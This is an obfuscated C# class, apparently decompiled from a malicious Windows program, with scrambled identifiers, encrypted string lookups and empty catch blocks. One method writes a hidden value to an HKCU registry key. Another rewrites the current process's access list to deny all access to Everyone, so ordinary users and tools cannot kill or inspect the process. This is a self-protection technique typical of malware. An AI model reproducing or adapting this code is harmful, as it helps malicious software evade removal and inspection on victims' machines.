using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace jtAYXTgtXeY;

internal sealed class XGJKGjsIlKam
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr ihEwYKWNRsmO, int NfVKMJKfNV, [Out] byte[] NrZlexVEsZiU, uint DBQDeIRaTMIlwA, out uint qSxRVGHRTUQYD);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr TJojoFNLMmeC, int NJvOjRJGCxso, [In] byte[] JYjEOpUMfuf);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void xNwWqpUyMLuwOf(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107401538)));
			registryKey.SetValue(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107401913)), getString_0(107402588));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor eWbYUHjXpo(IntPtr intptr_0)
	{
		byte[] nrZlexVEsZiU = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, nrZlexVEsZiU, 0u, out var qSxRVGHRTUQYD);
		if ((long)qSxRVGHRTUQYD > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, nrZlexVEsZiU = new byte[qSxRVGHRTUQYD], qSxRVGHRTUQYD, out qSxRVGHRTUQYD))
		{
			return null;
		}
		return new RawSecurityDescriptor(nrZlexVEsZiU, 0);
	}

	private void EhzAbjsRpqP(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void rDdgjdQlSDYdzW()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = eWbYUHjXpo(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			EhzAbjsRpqP(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static XGJKGjsIlKam()
	{
		Strings.CreateGetStringDelegate(typeof(XGJKGjsIlKam));
	}
}
